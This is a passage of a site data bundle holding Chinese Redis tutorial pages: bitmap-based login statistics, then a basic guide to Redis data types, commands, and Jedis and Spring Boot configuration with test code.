withscores\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 五、bitmap 场景\n\n如何用redis存储统计1亿用户一年的登陆情况，并快速检索任意时间窗口内的活跃用户数量？redis如何做亿级用户登录日活统计？\n\n利用redis的bitmap，value是一个二进制数据，每一位只能是0或者1。\n\n// setbit key offset value\n// 用户登录，用户id为整型\nsetbit login:20220505 uid 1\n        \n// 判断用户某日是否登录过\ngetbit login:20220505 uid\n        \n// 每日用户登录数量统计 bitcount key [start] [end]\nbitcount login:20220505\n\n// 活跃用户(连续三日登录)统计 bitop operation destkey key [key …]\n/* bitmap的bitop命令支持对bitmap进行and(与)，(or)或，xor(亦或)，not(非)四种相关操作;\n    我们对近三日的bitmap做and操作即可，操作之后会形成一个新的bitmap，\n    我们可以取名为login:top_count \n */\n/* 然后我们可以对login:top_count使用bitcount或者getbit命令，\n    用于统计活跃用户数量，或者查看某个用户是否为活跃用户\n */\nbitop and login:top_count login:20201005 login:20201004 login:20201003\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n以上就是了解redis常见应用场景的详细内容。",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Redis - 基础",frontmatter:{title:"Redis - 基础",date:"2019-08-04T18:41:12.000Z",tags:["Redis"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/redis01.html",relativePath:"views/backend/redis01.md",key:"v-68b17dd4",path:"/views/backend/redis01.html",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:53},{level:2,title:"redis提供的5中数据类型",slug:"redis提供的5中数据类型",normalizedTitle:"redis提供的5中数据类型",charIndex:59},{level:2,title:"redis使用场景",slug:"redis使用场景",normalizedTitle:"redis使用场景",charIndex:77},{level:2,title:"redis常用命令:",slug:"redis常用命令",normalizedTitle:"redis常用命令:",charIndex:90},{level:3,title:"string:",slug:"string",normalizedTitle:"string:",charIndex:106},{level:3,title:"hash:(效率最高)",slug:"hash-效率最高",normalizedTitle:"hash:(效率最高)",charIndex:119},{level:3,title:"list:",slug:"list",normalizedTitle:"list:",charIndex:136},{level:3,title:"set:(一般用交集并集)",slug:"set-一般用交集并集",normalizedTitle:"set:(一般用交集并集)",charIndex:147},{level:3,title:"zset:",slug:"zset",normalizedTitle:"zset:",charIndex:166},{level:2,title:"事务：(不推荐使用)",slug:"事务-不推荐使用",normalizedTitle:"事务：(不推荐使用)",charIndex:175},{level:2,title:"简单 spring配置jedis(相当于jdbc):",slug:"简单-spring配置jedis-相当于jdbc",normalizedTitle:"简单 spring配置jedis(相当于jdbc):",charIndex:189},{level:2,title:"详细 在spring中使用redis",slug:"详细-在spring中使用redis",normalizedTitle:"详细 在spring中使用redis",charIndex:219},{level:2,title:"详细 在springboot中使用redis",slug:"详细-在springboot中使用redis",normalizedTitle:"详细 在springboot中使用redis",charIndex:241},{level:2,title:"redis缓存与数据库同步",slug:"redis缓存与数据库同步",normalizedTitle:"redis缓存与数据库同步",charIndex:267}],excerpt:"<Boxx/>\n<p>对Redis的总结：常用命令、使用场景、在Spring中使用、在SpringBoot中是使用</p>\n",headersStr:"简介 redis提供的5中数据类型 redis使用场景 redis常用命令: string: hash:(效率最高) list: set:(一般用交集并集) zset: 事务：(不推荐使用) 简单 spring配置jedis(相当于jdbc): 详细 在spring中使用redis 详细 在springboot中使用redis redis缓存与数据库同步",content:'对Redis的总结：常用命令、使用场景、在Spring中使用、在SpringBoot中是使用\n\n\n\n * 简介\n * redis提供的5中数据类型\n * redis使用场景\n * redis常用命令:\n   * string:\n   * hash:(效率最高)\n   * list:\n   * set:(一般用交集并集)\n   * zset:\n * 事务：(不推荐使用)\n * 简单 spring配置jedis(相当于jdbc):\n * 详细 在spring中使用redis\n * 详细 在springboot中使用redis\n * redis缓存与数据库同步\n\n\n\n\n# 简介\n\nRedis(非关系型数据库)： 先开启服务器端service,再打开客户端cil\n\nRedis和MongoDB是当前使用最广泛的NoSQL，而就Redis技术而言，它的性能十分优越，可以支持每秒十几万此的读/写操作，其性能远超数据库，并且还支持集群、分布式、主从同步等配置，原则上可以无限扩展，让更多的数据存储在内存中，更让人欣慰的是它还支持一定的事务能力，这保证了高并发的场景下数据的安全和一致性\n\n> redis 特点\n\n 1. 单线程,底层c语言开发,默认16个数据库(下表从0开始)\n 2. 支持事务(原子性)\n 3. redis持久化 -> 存储在磁盘中,占用内存\n 4. 99%都是部署在Linux系统上\n\n> redis 优缺点\n\n 1. 优点: (1) 读写性能优异\n    \n    (2)支持数据持久化，支持AOF和RDB两种持久化方式\n    \n    (3)支持主从复制，主机会自动将数据同步到从机，可以进行读写分离\n    \n    (4)数据结构丰富：除了支持string类型的value外还支持string、hash、set、sortedset、list等数据结构\n\n 2. 缺点: (1) 缺少结构化(没有表和字段的概念)，可读性查，不能使用where条件\n    \n    (2) 由于是内存数据库，费内存\n    \n    (3)不具备自动容错和恢复功能，主机从机的宕机都会导致前端部分读写请求失败，需要等待机器重启或者手动切换前端的IP才能恢复 --- 更多\n\n\n# redis提供的5中数据类型\n\n\n\n 1. string 最大存储长度为512M\n    \n    实战场景：\n    \n    1. 缓存： 经典使用场景，把常用信息，字符串，图片或者视频等信息放到redis中，redis作为缓存层，mysql做持久化层，降低mysql的读写压力。\n    2. 计数器：redis是单线程模型，一个命令执行完才会执行下一个，同时数据可以一步落地到其他的数据源。\n    3. session：常见方案spring session + redis实现session共享\n    4. 原子计数器\n\n 2. list (linkedlist)双向列表\n    \n    实战场景：刷微博的下拉分页\n\n 3. hash hashmap\n    \n    实战场景：无，一般用到很少。\n\n 4. set hashset 无序\n    \n    实战场景：\n    \n    1. 标签（tag）,给用户添加标签，或者用户给消息添加标签，这样有同一标签或者类似标签的可以给推荐关注的事或者关注的人。\n    2. 点赞，或点踩，收藏等，可以放到set中实现\n\n 5. zset treeset 有序\n    \n    实战场景：排行榜, 有序集合经典使用场景。\n\n\n# redis使用场景\n\n 1. 缓存 替数据库 MySQL Oracle 分担一部分压力\n 2. 分页 点赞 踩 统计用户访问量 在线人数\n 3. 分布式锁\n 4. 单点登录 spring session cookie session\n\n\n# redis常用命令:\n\n * flushdb 清空当前的数据库(慎用)\n * flushall 清空所有的数据库(根本就不要用)\n * select 15 切换到第16个数据库\n\n\n# string:\n\n命令                    释义\nset key value         设置key和value\nget key               通过key拿值\ndel key1,key2,..      删除一个或多个数据\nexpire key 10         设置消亡时间，10秒后这个key就删除\nkeys k                查询所有的包含k的key\nttl key               当设置消亡时间后,以秒为单位返回key的剩余时间 (-1代表没有设置,-2代表已被删除)\nmove key1 15          把key1移动到第16个数据库(从0开始)\nrename key1 key2      把key1重新命名为key2 （如果key2已存在那会覆盖 ）\nRENAMENX              当且仅当 newkey 不存在时，将 key 改名为 newkey\nappend key1 valueX    如果key1存在就把valueX追加到原先value的末尾,key1不存在就是set\nmset k1 v1 k2 v2 ..   批量新增\nmget k1 k2 k3 ...     批量拿值\nincr key              将 key 中储存的数字值自动增一\nincrby key 数字         将 key 所储存的值加上增量\ndecrby key 数字         将 key 所储存的值减上数字\nsetnx key value       将 key 的值设为 value ，当且仅当 key 不存在。若给定的 key 已经存在，则SETNX 不做任何动作。\nstrlen key            返回key所对应的value的长度\n\n\n# hash:(效率最高)\n\n命令                                  释义\nhset key(相当于表) field(字段) value(值)   建表和赋值 key必须唯一,不然会覆盖\nhget key field                      取值\nhkeys key                           获取key中所有的字段\nhvals key                           获取key中所有的值\n\n\n# list:\n\n命令                                   释义\nlpush key v1 v2 v3                   在key中依次插入3个值,每次插入都放在最左边\nlrange key start(起始下标) stop(结束下标)    取出key中从下标start到stop(包含)的值\nlrange list (当前页-1)rows pagerows-1   分页\n\n\n# set:(一般用交集并集)\n\n命令                     释义\nsadd key 元素1 元素2 ...   添加多个元素到集合中\nsmembers key           取出集合中的所有成员\n\n\n# zset:\n\n命令                                 释义\nzadd key score(值) member(字段)       score必须得是int/float\nzrange key start stop              获取所有的member\nzrange key start stop withscores   获取所有的member和score\n\n\n# 事务：(不推荐使用)\n\nmulti 开启事务 ...添加队列操作 exec 执行事务\n\nredis支持lua脚本： //key[]/argv[]可以有多个,2表示有两个key,后边是依次给key和argv赋值 eval "return {keys[1],key[2],argv[1],argv[2]}" 2 key1 key2 1 2\n\n> 注意：redis缓存操作和数据库操作若要成为一个事务,即当数据库操作添加失败时也不能进到缓存中 所以我们只能造一个异常出来,因为事务的异常只能抛 事务的底层有一个try cath ,会把我们自己try的捕获,当出问题时我们try会使事务失效\n\n\n# 简单 spring配置jedis(相当于jdbc):\n\n 0. 导入jar包\n 1. 在xml中配置数据源 JedisPoolConfig maxTotal 最大连接数 minIdle 最小空闲数 minIdle 最大空闲数 maxWaitMillis 超时时间\n 2. 客户端连接服务端操作(没有set方法,只能通过构造方法注入属性) JedisPool poolConfig 注入1连接池 host IP地址 port 端口号\n\n\n# 详细 在spring中使用redis\n\n 1. 配置xml applicationContext-redis.xml\n\n\t\x3c!-- redis单机版 --\x3e\n\t<bean id="jedisPool" class="redis.clients.jedis.JedisPool">\n\t\t<constructor-arg name="host" value="192.168.25.153"/>\t\n\t\t<constructor-arg name="port" value="6379"/>\t\n\t</bean>\n\t\x3c!-- 我们封装的jedis常用方法类 --\x3e\n\t<bean id="jedisClientPool" class="com.taotao.jedis.JedisClientPool"/>\n\n\t\x3c!-- redis集群 --\x3e\n\t\x3c!-- <bean id="jedisCluster" class="redis.clients.jedis.JedisCluster">\n\t\t<constructor-arg>\n\t\t\t<set>\n\t\t\t\t<bean class="redis.clients.jedis.HostAndPort">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7001"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.HostAndPort">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7002"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.HostAndPort">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7003"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.HostAndPort">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7004"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.HostAndPort">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7005"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.HostAndPort">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7006"/>\n\t\t\t\t</bean>\n\t\t\t</set>\n\t\t</constructor-arg>\n\t</bean>\n\t<bean id="jedisClientCluster" class="com.taotao.jedis.JedisClientCluster"/> --\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n 2. 可配置的redis连接池\n\n// 池基本配置\nJedisPoolConfig config = new JedisPoolConfig();\n\n//是否启用后进先出, 默认true\nconfig.setLifo(true);\n//最大空闲连接数, 默认8个\nconfig.setMaxIdle(8);\n//最大连接数, 默认8个\nconfig.setMaxTotal(8);\n//获取连接时的最大等待毫秒数(如果设置为阻塞时BlockWhenExhausted),如果超时就抛异常, 小于零:阻塞不确定的时间,  默认-1\nconfig.setMaxWaitMillis(-1);\n//逐出连接的最小空闲时间 默认1800000毫秒(30分钟)\nconfig.setMinEvictableIdleTimeMillis(1800000);\n//最小空闲连接数, 默认0\nconfig.setMinIdle(0);\n//每次逐出检查时 逐出的最大数目 如果为负数就是 : 1/abs(n), 默认3\nconfig.setNumTestsPerEvictionRun(3);\n//对象空闲多久后逐出, 当空闲时间>该值 且 空闲连接>最大空闲数 时直接逐出,不再根据MinEvictableIdleTimeMillis判断  (默认逐出策略)\nconfig.setSoftMinEvictableIdleTimeMillis(1800000);\n//在获取连接的时候检查有效性, 默认false\nconfig.setTestOnBorrow(false);\n//在空闲时检查有效性, 默认false\nconfig.setTestWhileIdle(false);\n\n// 使用配置创建连接池\njedisPool = new JedisPool(config, host, port);\nJedis jedis = pool.getResource();// 从连接池中获取单个连接\n//jedis.auth("password");// 如果需要密码\n\n//...各种jedis操作\n\n//jedis.close();//用完记得关闭连接\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n 3. 对redis单机版、连接池版、集群版的简单测试\n\npackage com.taotao.jedis;\n\nimport java.util.HashSet;\nimport java.util.Set;\n\nimport org.junit.Test;\n\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.JedisPool;\n\npublic class TestJedis {\n\n\t@Test\n\tpublic void testJedis() throws Exception {\n\t\t//创建一个jedis对象，需要指定服务的ip和端口号\n\t\tJedis jedis = new Jedis("192.168.25.153", 6379);\n\t\t//直接操作数据库\n\t\tjedis.set("jedis-key", "1234");\n\t\tString result = jedis.get("jedis-key");\n\t\tSystem.out.println(result);\n\t\t//关闭jedis\n\t\tjedis.close();\n\t}\n\t\n\t@Test\n\tpublic void testJedisPool() throws Exception {\n\t\t//创建一个数据库连接池对象（单例），需要指定服务的ip和端口号\n\t\tJedisPool jedisPool = new JedisPool("192.168.25.153", 6379);\n\t\t//从连接池中获得连接\n\t\tJedis jedis = jedisPool.getResource();\n\t\t//使用Jedis操作数据库（方法级别使用）\n\t\tString result = jedis.get("jedis-key");\n\t\tSystem.out.println(result);\n\t\t//一定要关闭Jedis连接\n\t\tjedis.close();\n\t\t//系统关闭前关闭连接池\n\t\tjedisPool.close();\n\t}\n\t\n\t@Test\n\tpublic void testJedisCluster() throws Exception {\n\t\t//创建一个JedisCluster对象，构造参数Set类型，集合中每个元素是HostAndPort类型\n\t\tSet<HostAndPort> nodes = new HashSet<>();\n\t\t//向集合中添加节点\n\t\tnodes.add(new HostAndPort("192.168.25.153", 7001));\n\t\tnodes.add(new HostAndPort("192.168.25.153", 7002));\n\t\tnodes.add(new HostAndPort("192.168.25.153", 7003));\n\t\tnodes.add(new HostAndPort("192.168.25.153", 7004));\n\t\tnodes.add(new HostAndPort("192.168.25.153", 7005));\n\t\tnodes.add(new HostAndPort("192.168.25.153", 7006));\n\t\tJedisCluster jedisCluster = new JedisCluster(nodes);\n\t\t//直接使用JedisCluster操作redis，自带连接池。jedisCluster对象可以是单例 的。\n\t\tjedisCluster.set("cluster-test", "hello jedis cluster");\n\t\tString string = jedisCluster.get("cluster-test");\n\t\tSystem.out.println(string);\n\t\t//系统关闭前关闭JedisCluster\n\t\tjedisCluster.close();\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n\n# 详细 在springboot中使用redis\n\n 1. 在SpringBoot中添加Redis依赖：\n\n\x3c!--redis依赖配置--\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n 2. 在SpringBoot中配置application-dev.yml\n\n  redis:\n    host: localhost # Redis服务器地址\n    database: 0 # Redis数据库索引（默认为0）\n    port: 6379 # Redis服务器连接端口\n    password: # Redis服务器连接密码（默认为空）\n    jedis:\n      pool:\n        max-active: 8 # 连接池最大连接数（使用负值表示没有限制）\n        max-wait: -1ms # 连接池最大阻塞等待时间（使用负值表示没有限制）\n        max-idle: 8 # 连接池中的最大空闲连接\n        min-idle: 0 # 连接池中的最小空闲连接\n    timeout: 3000ms # 连接超时时间（毫秒）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 3. 常用的redis操作\n\n> 通过springboot自动配置的StringRedisTemplate对象进行Redis的读写操作\n\npackage com.macro.mall.portal.service.impl;\n\nimport com.macro.mall.portal.service.RedisService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.redis.core.StringRedisTemplate;\nimport org.springframework.stereotype.Service;\n\nimport java.util.concurrent.TimeUnit;\n\n/**\n * redis操作Service的实现类\n */\n@Service\npublic class RedisServiceImpl implements RedisService {\n    @Autowired\n    private StringRedisTemplate stringRedisTemplate;\n\n    @Override\n    public void set(String key, String value) {\n        stringRedisTemplate.opsForValue().set(key, value);\n    }\n\n    @Override\n    public String get(String key) {\n        return stringRedisTemplate.opsForValue().get(key);\n    }\n\n    @Override\n    public boolean expire(String key, long expire) {\n        return stringRedisTemplate.expire(key, expire, TimeUnit.SECONDS);\n    }\n\n    @Override\n    public void remove(String key) {\n        stringRedisTemplate.delete(key);\n    }\n\n    @Override\n    public Long increment(String key, long delta) {\n        return stringRedisTemplate.opsForValue().increment(key,delta);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n 4. redis的其他操作\n\n> 注意：使用redis存储对象的时候，一定要将对象序列化（实现Serializable接口或自己写序列化工具类）\n> \n> 其他操作（集合、hash等）详见：https://www.jianshu.com/p/56999f2b8e3b\n\n\n# redis缓存与数据库同步\n\n * 新增：数据库新增后，放到缓存中\n\n * 删除：删除数据库相应数据后删除缓存（或延时双删）\n\n * 查询：\n\n\n\n * 更新：一般是先跟新数据库，再删除缓存（或延时双删）\n\n',normalizedContent:'对redis的总结：常用命令、使用场景、在spring中使用、在springboot中是使用\n\n\n\n * 简介\n * redis提供的5中数据类型\n * redis使用场景\n * redis常用命令:\n   * string:\n   * hash:(效率最高)\n   * list:\n   * set:(一般用交集并集)\n   * zset:\n * 事务：(不推荐使用)\n * 简单 spring配置jedis(相当于jdbc):\n * 详细 在spring中使用redis\n * 详细 在springboot中使用redis\n * redis缓存与数据库同步\n\n\n\n\n# 简介\n\nredis(非关系型数据库)： 先开启服务器端service,再打开客户端cil\n\nredis和mongodb是当前使用最广泛的nosql，而就redis技术而言，它的性能十分优越，可以支持每秒十几万此的读/写操作，其性能远超数据库，并且还支持集群、分布式、主从同步等配置，原则上可以无限扩展，让更多的数据存储在内存中，更让人欣慰的是它还支持一定的事务能力，这保证了高并发的场景下数据的安全和一致性\n\n> redis 特点\n\n 1. 单线程,底层c语言开发,默认16个数据库(下表从0开始)\n 2. 支持事务(原子性)\n 3. redis持久化 -> 存储在磁盘中,占用内存\n 4. 99%都是部署在linux系统上\n\n> redis 优缺点\n\n 1. 优点: (1) 读写性能优异\n    \n    (2)支持数据持久化，支持aof和rdb两种持久化方式\n    \n    (3)支持主从复制，主机会自动将数据同步到从机，可以进行读写分离\n    \n    (4)数据结构丰富：除了支持string类型的value外还支持string、hash、set、sortedset、list等数据结构\n\n 2. 缺点: (1) 缺少结构化(没有表和字段的概念)，可读性查，不能使用where条件\n    \n    (2) 由于是内存数据库，费内存\n    \n    (3)不具备自动容错和恢复功能，主机从机的宕机都会导致前端部分读写请求失败，需要等待机器重启或者手动切换前端的ip才能恢复 --- 更多\n\n\n# redis提供的5中数据类型\n\n\n\n 1. string 最大存储长度为512m\n    \n    实战场景：\n    \n    1. 缓存： 经典使用场景，把常用信息，字符串，图片或者视频等信息放到redis中，redis作为缓存层，mysql做持久化层，降低mysql的读写压力。\n    2. 计数器：redis是单线程模型，一个命令执行完才会执行下一个，同时数据可以一步落地到其他的数据源。\n    3. session：常见方案spring session + redis实现session共享\n    4. 原子计数器\n\n 2. list (linkedlist)双向列表\n    \n    实战场景：刷微博的下拉分页\n\n 3. hash hashmap\n    \n    实战场景：无，一般用到很少。\n\n 4. set hashset 无序\n    \n    实战场景：\n    \n    1. 标签（tag）,给用户添加标签，或者用户给消息添加标签，这样有同一标签或者类似标签的可以给推荐关注的事或者关注的人。\n    2. 点赞，或点踩，收藏等，可以放到set中实现\n\n 5. zset treeset 有序\n    \n    实战场景：排行榜, 有序集合经典使用场景。\n\n\n# redis使用场景\n\n 1. 缓存 替数据库 mysql oracle 分担一部分压力\n 2. 分页 点赞 踩 统计用户访问量 在线人数\n 3. 分布式锁\n 4. 单点登录 spring session cookie session\n\n\n# redis常用命令:\n\n * flushdb 清空当前的数据库(慎用)\n * flushall 清空所有的数据库(根本就不要用)\n * select 15 切换到第16个数据库\n\n\n# string:\n\n命令                    释义\nset key value         设置key和value\nget key               通过key拿值\ndel key1,key2,..      删除一个或多个数据\nexpire key 10         设置消亡时间，10秒后这个key就删除\nkeys k                查询所有的包含k的key\nttl key               当设置消亡时间后,以秒为单位返回key的剩余时间 (-1代表没有设置,-2代表已被删除)\nmove key1 15          把key1移动到第16个数据库(从0开始)\nrename key1 key2      把key1重新命名为key2 （如果key2已存在那会覆盖 ）\nrenamenx              当且仅当 newkey 不存在时，将 key 改名为 newkey\nappend key1 valuex    如果key1存在就把valuex追加到原先value的末尾,key1不存在就是set\nmset k1 v1 k2 v2 ..   批量新增\nmget k1 k2 k3 ...     批量拿值\nincr key              将 key 中储存的数字值自动增一\nincrby key 数字         将 key 所储存的值加上增量\ndecrby key 数字         将 key 所储存的值减上数字\nsetnx key value       将 key 的值设为 value ，当且仅当 key 不存在。若给定的 key 已经存在，则setnx 不做任何动作。\nstrlen key            返回key所对应的value的长度\n\n\n# hash:(效率最高)\n\n命令                                  释义\nhset key(相当于表) field(字段) value(值)   建表和赋值 key必须唯一,不然会覆盖\nhget key field                      取值\nhkeys key                           获取key中所有的字段\nhvals key                           获取key中所有的值\n\n\n# list:\n\n命令                                   释义\nlpush key v1 v2 v3                   在key中依次插入3个值,每次插入都放在最左边\nlrange key start(起始下标) stop(结束下标)    取出key中从下标start到stop(包含)的值\nlrange list (当前页-1)rows pagerows-1   分页\n\n\n# set:(一般用交集并集)\n\n命令                     释义\nsadd key 元素1 元素2 ...   添加多个元素到集合中\nsmembers key           取出集合中的所有成员\n\n\n# zset:\n\n命令                                 释义\nzadd key score(值) member(字段)       score必须得是int/float\nzrange key start stop              获取所有的member\nzrange key start stop withscores   获取所有的member和score\n\n\n# 事务：(不推荐使用)\n\nmulti 开启事务 ...添加队列操作 exec 执行事务\n\nredis支持lua脚本： //key[]/argv[]可以有多个,2表示有两个key,后边是依次给key和argv赋值 eval "return {keys[1],key[2],argv[1],argv[2]}" 2 key1 key2 1 2\n\n> 注意：redis缓存操作和数据库操作若要成为一个事务,即当数据库操作添加失败时也不能进到缓存中 所以我们只能造一个异常出来,因为事务的异常只能抛 事务的底层有一个try cath ,会把我们自己try的捕获,当出问题时我们try会使事务失效\n\n\n# 简单 spring配置jedis(相当于jdbc):\n\n 0. 导入jar包\n 1. 在xml中配置数据源 jedispoolconfig maxtotal 最大连接数 minidle 最小空闲数 minidle 最大空闲数 maxwaitmillis 超时时间\n 2. 客户端连接服务端操作(没有set方法,只能通过构造方法注入属性) jedispool poolconfig 注入1连接池 host ip地址 port 端口号\n\n\n# 详细 在spring中使用redis\n\n 1. 配置xml applicationcontext-redis.xml\n\n\t\x3c!-- redis单机版 --\x3e\n\t<bean id="jedispool" class="redis.clients.jedis.jedispool">\n\t\t<constructor-arg name="host" value="192.168.25.153"/>\t\n\t\t<constructor-arg name="port" value="6379"/>\t\n\t</bean>\n\t\x3c!-- 我们封装的jedis常用方法类 --\x3e\n\t<bean id="jedisclientpool" class="com.taotao.jedis.jedisclientpool"/>\n\n\t\x3c!-- redis集群 --\x3e\n\t\x3c!-- <bean id="jediscluster" class="redis.clients.jedis.jediscluster">\n\t\t<constructor-arg>\n\t\t\t<set>\n\t\t\t\t<bean class="redis.clients.jedis.hostandport">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7001"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.hostandport">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7002"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.hostandport">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7003"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.hostandport">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7004"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.hostandport">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7005"/>\n\t\t\t\t</bean>\n\t\t\t\t<bean class="redis.clients.jedis.hostandport">\n\t\t\t\t\t<constructor-arg name="host" value="192.168.25.153"/>\n\t\t\t\t\t<constructor-arg name="port" value="7006"/>\n\t\t\t\t</bean>\n\t\t\t</set>\n\t\t</constructor-arg>\n\t</bean>\n\t<bean id="jedisclientcluster" class="com.taotao.jedis.jedisclientcluster"/> --\x3e\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n 2. 可配置的redis连接池\n\n// 池基本配置\njedispoolconfig config = new jedispoolconfig();\n\n//是否启用后进先出, 默认true\nconfig.setlifo(true);\n//最大空闲连接数, 默认8个\nconfig.setmaxidle(8);\n//最大连接数, 默认8个\nconfig.setmaxtotal(8);\n//获取连接时的最大等待毫秒数(如果设置为阻塞时blockwhenexhausted),如果超时就抛异常, 小于零:阻塞不确定的时间,  默认-1\nconfig.setmaxwaitmillis(-1);\n//逐出连接的最小空闲时间 默认1800000毫秒(30分钟)\nconfig.setminevictableidletimemillis(1800000);\n//最小空闲连接数, 默认0\nconfig.setminidle(0);\n//每次逐出检查时 逐出的最大数目 如果为负数就是 : 1/abs(n), 默认3\nconfig.setnumtestsperevictionrun(3);\n//对象空闲多久后逐出, 当空闲时间>该值 且 空闲连接>最大空闲数 时直接逐出,不再根据minevictableidletimemillis判断  (默认逐出策略)\nconfig.setsoftminevictableidletimemillis(1800000);\n//在获取连接的时候检查有效性, 默认false\nconfig.settestonborrow(false);\n//在空闲时检查有效性, 默认false\nconfig.settestwhileidle(false);\n\n// 使用配置创建连接池\njedispool = new jedispool(config, host, port);\njedis jedis = pool.getresource();// 从连接池中获取单个连接\n//jedis.auth("password");// 如果需要密码\n\n//...各种jedis操作\n\n//jedis.close();//用完记得关闭连接\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n 3. 对redis单机版、连接池版、集群版的简单测试\n\npackage com.taotao.jedis;\n\nimport java.util.hashset;\nimport java.util.set;\n\nimport org.junit.test;\n\nimport redis.clients.jedis.hostandport;\nimport redis.clients.jedis.jedis;\nimport redis.clients.jedis.jediscluster;\nimport redis.clients.jedis.jedispool;\n\npublic class testjedis {\n\n\t@test\n\tpublic void testjedis() throws exception {\n\t\t//创建一个jedis对象，需要指定服务的ip和端口号\n\t\tjedis jedis = new jedis("192.168.25.153", 6379);\n\t\t//直接操作数据库\n\t\tjedis.set("jedis-key", "1234");\n\t\tstring result = jedis.get("jedis-key");\n\t\tsystem.out.println(result);\n\t\t//关闭jedis\n\t\tjedis.close();\n\t}\n\t\n\t@test\n\tpublic void testjedispool() throws exception {\n\t\t//创建一个数据库连接池对象（单例），需要指定服务的ip和端口号\n\t\tjedispool jedispool = new jedispool("192.168.25.153", 6379);\n\t\t//从连接池中获得连接\n\t\tjedis jedis = jedispool.getresource();\n\t\t//使用jedis操作数据库（方法级别使用）\n\t\tstring result = jedis.get("jedis-key");\n\t\tsystem.out.println(result);\n\t\t//一定要关闭jedis连接\n\t\tjedis.close();\n\t\t//系统关闭前关闭连接池\n\t\tjedispool.close();\n\t}\n\t\n\t@test\n\tpublic void testjediscluster() throws exception {\n\t\t//创建一个jediscluster对象，构造参数set类型，集合中每个元素是hostandport类型\n\t\tset<hostandport> nodes = new hashset<>();\n\t\t//向集合中添加节点\n\t\tnodes.add(new hostandport("192.168.25.153", 7001));\n\t\tnodes.add(new hostandport("192.168.25.153", 7002));\n\t\tnodes.add(new hostandport("192.168.25.153", 7003));\n\t\tnodes.add(new hostandport("192.168.25.153", 7004));\n\t\tnodes.add(new hostandport("192.168.25.153", 7005));\n\t\tnodes.add(new hostandport("192.168.25.153", 7006));\n\t\tjediscluster jediscluster = new jediscluster(nodes);\n\t\t//直接使用jediscluster操作redis，自带连接池。jediscluster对象可以是单例 的。\n\t\tjediscluster.set("cluster-test", "hello jedis cluster");\n\t\tstring string = 